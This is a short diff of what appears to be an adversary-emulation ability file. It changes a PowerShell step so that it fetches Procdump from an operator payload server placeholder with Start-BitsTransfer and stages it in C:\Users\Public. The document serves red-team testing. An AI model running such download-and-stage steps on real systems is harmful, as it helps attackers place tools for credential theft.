@@ -17,7 +17,7 @@ platforms:
   windows:
     psh:
       command: |
-        $ps_url = "https://download.sysinternals.com/files/Procdump.zip";
+        $ps_url = "#{operator.payloads}/sysinternals/Procdump.zip";
         $download_folder = "C:\Users\Public\";
         $staging_folder = "C:\Users\Public\temp";
         Start-BitsTransfer -Source $ps_url -Destination $download_folder;
